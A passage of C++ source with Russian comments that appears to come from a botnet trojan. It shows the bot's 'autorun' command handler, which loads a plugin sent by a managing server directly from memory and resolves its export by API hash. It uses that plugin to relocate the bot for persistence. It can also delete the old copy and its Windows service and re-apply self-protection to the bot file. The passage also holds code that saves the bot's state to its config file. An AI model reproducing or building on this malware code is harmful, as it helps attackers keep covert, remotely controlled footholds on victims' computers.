				if( i > 1 ) args2 += ' ';
				args2 += *sa[i];
			}
			SaveCmdInConfigFile( cmd2, args2, stop );
		}
		if( stop )
			Plugin::Stop( plg.name, stop_func);
		else
			Plugin::Run(&plg);
	}
}

/*************************************** команда autorun *************************************************/
//формат команды: autorun имя-плагина [olddel]
//загружает указанный плагин, который должен содержать экспортную функцию Execute и выполнять установку автозапуска
//если указан olddel, то после успешной отработки плагина, старый автозапуск удаляется

typedef int (WINAPI *autorunExecute)( const char* fileName, void* body, int c_body, char* newFileName );

static void AutorunLoadedPlugin( Pipe::AutoMsg msg, DWORD tag )
{
	if( msg->sz_data == 0 )
	{
		DbgMsg( "Плагин для autorun не загружен" );
		return;
	}
	DbgMsg( "Загрузили плагин для autorun" );
	HMODULE dll = RunInMem::RunDll( msg->data, msg->sz_data );
	if( !dll ) 
	{
		DbgMsg( "Не удалось запустить плагин для autorun" );
		return;
	}
	autorunExecute func = (autorunExecute)WinAPI::GetApiAddr( dll, 0x0cebace5 /*Execute*/ );
	if( func )
	{
		char* fileName = Path::GetFileName(Config::fileNameBot);
		Mem::Data body;
		File::ReadAll( Config::fileNameBot, body );
		char newFileName[MAX_PATH]; //новое место куда расположили файл бота
		if( func( fileName, body.p_byte(), body.Len(), newFileName ) )
		{
			DbgMsg( "Плагин для autorun выполнился успешно, новое расположение %s", newFileName );
			ManagerServer::SetGlobalState( GlobalState_LeftAutorun, '1' );
			if( tag ) //olddel
			{
				DbgMsg( "Удаляем старую автозагрузку" );
				UnprotectBot();
				File::DeleteHard(Config::fileNameBot);
				if( Config::state & IS_SERVICE )
				{
					Service::Delete(Config::nameService);
				}
				StringBuilderStack<MAX_PATH> fileName2;
				Service::GetFileNameService(fileName2);
				File::DeleteHard(fileName2);
		
				Str::Copy( Config::fileNameBot, sizeof(Config::fileNameBot), newFileName );
				ProtectBot();
			}
		}
		else
			DbgMsg( "Плагин для autorun не установил новую автозагрузку" );
	}
	else
		DbgMsg( "В плагине для autorun не найдена функция Execute" );
	RunInMem::FreeDll(dll);
}

void ExecCmd_Autorun( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды autorun[%s](%s)", cmd.c_str(), args.c_str() );
	StringArray sa = args.Split(' ');
	if( sa.Count() > 0 ) 
	{
		int olddel = 0;
		if( sa.Count() > 1 )
		{
			if( sa[1]->Hash() == 0x0762aabc /*olddel*/ ) olddel = 1;
		}
		ManagerServer::LoadPlugin( *sa[0], AutorunLoadedPlugin, 0, (DWORD)olddel );
	}
}

/*************************************** команда msgbox *************************************************/
/*
static void ExecCmd_MsgBox( StringBuilder& cmd, StringBuilder& args )
{
	StringArray sa = args.Split('|');
	if( sa.Count() > 0 )
	{
		const char* msg = sa[0]->c_str();
		const char* caption = 0;
		const char* fileName = 0;
		if( sa.Count() > 1 )
		{
			caption = sa[1]->c_str();
			if( sa.Count() > 2 )
				fileName = sa[2]->c_str();
		}
		MessageBoxA( 0, msg, caption, 0 );
		if( fileName )
		{
			StringBuilderStack<MAX_PATH> path;
			Path::GetCSIDLPath( CSIDL_DESKTOPDIRECTORY, path, fileName );
			File::WriteAll( path, 0, 0 );
		}
	}
}
*/
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void TaskServer::GetGlobalState( int id )
{
	int len = Str::Len(Task::stateConfigFile);
	if( len <= id )
		state = '0';
	else
		state = Task::stateConfigFile[id];
}

static DWORD WINAPI SaveStateConfigThread( void* )
{
	StringBuilderStack<16> cmd( _CS_("state") );
	int len = Str::Len(Task::stateConfigFile);
	StringBuilder args( 0, len + 1, Task::stateConfigFile, len );
	Task::SaveCmdInConfigFile( cmd, args, false );
	return 0;
}

void TaskServer::SetGlobalState( int id, char v )
{
	int len = Str::Len(Task::stateConfigFile);
	if( len <= id )
	{
		char* s = Str::Alloc(id + 1);
		Mem::Copy( s, Task::stateConfigFile, len );
		Mem::Set( s + len, '0', id - len + 1 );
		s[id + 1] = 0;
		Str::Free(Task::stateConfigFile);
		Task::stateConfigFile = s;
	}
	state = Task::stateConfigFile[id];
	Task::stateConfigFile[id] = v;
	RunThread( SaveStateConfigThread, 0 );
}
